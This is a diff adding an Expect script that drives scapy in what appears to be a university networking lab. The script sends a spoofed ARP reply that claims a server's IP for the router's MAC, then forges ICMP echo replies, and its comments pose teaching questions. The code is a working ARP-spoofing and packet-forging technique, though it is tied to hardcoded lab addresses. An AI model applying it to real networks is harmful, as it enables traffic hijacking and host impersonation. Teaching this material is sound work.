@@ -1,0 +1,72 @@
+#!/usr/bin/expect
+#
+# Author: M. Dacier
+# January 2022
+
+spawn "/usr/bin/scapy";
+expect ">>> ";
+
+# PAY ATTENTION TO escape the following chars: " [ and ]
+
+# Trivial script to reply to an ARP request from c3 looking for MAC address
+# corresponding to IP 20.20.20.55 (ie s3). 
+# The answer sent the local MAC address of the machine where the script
+# is launched from (normally r2)
+# Tons of dependencies hardcoded on purpose to avoid this code to
+# be used by script kiddies as an attack tool.
+
+# Usage:
+# on S3 (20.20.20.55), block ARP replies:  arptables -A OUTPUT -j DROP
+# on r2: launch this script
+# on C3, remove the MAC address of s3 from the cache: arp -d 20.20.20.55
+# Q: why?
+# on C3, launch the command ping -nc 5 20.20.20.55
+# Q: what happens if you send less than 3 packets? Or just 3 packets? 
+
+# First, let us reply to the ARP request
+
+send "r2_mac=get_if_hwaddr(\"eth2\")\r"
+send "w=sniff(filter=\"arp\", count=1, iface=\"eth2\")\r"
+send "arp_reply=ARP(op=2, hwsrc=r2_mac,psrc=\"20.20.20.55\",hwdst=\"aa:03:03:03:03:03\", pdst=\"20.20.20.89\")\r"
+send "send(arp_reply)\r"
+
+# Second, let us wait for 3 ICMP requests
+# Q: what happens si I wait for only 1 and send 5 replies?
+
+send "q=sniff(filter=\"icmp\", count=3, iface=\"eth2\")\r"
+
+# We use the received request to build the reply
+# We need the identifier and the sequence number
+send "a=q\[0\].copy()\r"
+send "a\[Ether\].dst=a\[Ether\].src\r"
+send "del a\[Ether\].src\r"
+send "a\[IP\].dst=a\[IP\].src\r"
+send "a\[IP\].src=\"20.20.20.55\"\r"
+
+# This is a reply
+send "a\[ICMP\].type=0\r"
+# We send the first response
+send "sendp(a, iface=\"eth2\")\r"
+# We increment the sequence number
+send "a\[ICMP\].seq=a\[ICMP\].seq+1\r"
+# We send the second response, etc.. 
+send "sendp(a, iface=\"eth2\")\r"
+send "a\[ICMP\].seq=a\[ICMP\].seq+1\r"
+send "sendp(a, iface=\"eth2\")\r"
+send "a\[ICMP\].seq=a\[ICMP\].seq+1\r"
+send "sendp(a, iface=\"eth2\")\r"
+send "a\[ICMP\].seq=a\[ICMP\].seq+1\r"
+send "sendp(a, iface=\"eth2\")\r"
+send "a\[ICMP\].seq=a\[ICMP\].seq+1\r"
+send "sendp(a, iface=\"eth2\")\r"
+send "a\[ICMP\].seq=a\[ICMP\].seq+1\r"
+send "sendp(a, iface=\"eth2\")\r"
+
+#Q: what happens if I send more responses, incremented properly, than requests?
+
+# This last command enables us to stay within scapy to type more commands
+# interactively, if we so desire.
+
+interact
+
+
